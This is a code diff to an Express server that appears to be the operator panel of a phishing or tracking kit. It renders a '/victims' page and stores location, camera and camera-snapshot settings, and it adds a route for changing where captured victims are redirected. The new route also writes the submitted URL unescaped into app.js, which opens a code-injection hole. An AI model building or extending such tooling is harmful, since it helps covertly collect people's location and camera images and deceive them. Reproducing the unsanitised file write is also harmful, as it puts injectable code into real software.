@@ -55,8 +55,11 @@ app.get("/victims", (req, res) => {
   } catch (err) {
     console.log("Using default URL");
   }
+
+  // Get current redirect URL from config
+  let redirectUrl = config.redirectURL;
   
-  res.render("victims", { currentUrl: currentUrl });
+  res.render("victims", { currentUrl: currentUrl, redirectUrl: redirectUrl });
 });
 
 // Add route to update URL
@@ -67,6 +70,38 @@ app.post("/update-url", (req, res) => {
     res.json({ success: true });
   } else {
     res.json({ success: false, error: "No URL provided" });
+  }
+});
+
+// Add route to update redirect URL
+app.post("/update-redirect-url", (req, res) => {
+  const newRedirectUrl = req.body.redirectUrl;
+  if (newRedirectUrl) {
+    // Update the config object
+    config.redirectURL = newRedirectUrl;
+    
+    // Update the app.js file
+    const configContent = `var config={
+location:${config.location},
+camera:${config.camera},
+camsnaps:${config.camsnaps},
+redirectURL:"${newRedirectUrl}"
+}
+
+
+
+module.exports ={config}
+`;
+    
+    try {
+      fs.writeFileSync("./app.js", configContent);
+      res.json({ success: true });
+    } catch (err) {
+      console.error("Error updating app.js:", err);
+      res.json({ success: false, error: "Failed to update config file" });
+    }
+  } else {
+    res.json({ success: false, error: "No redirect URL provided" });
   }
 });
 app.post("/", (req, res) => {
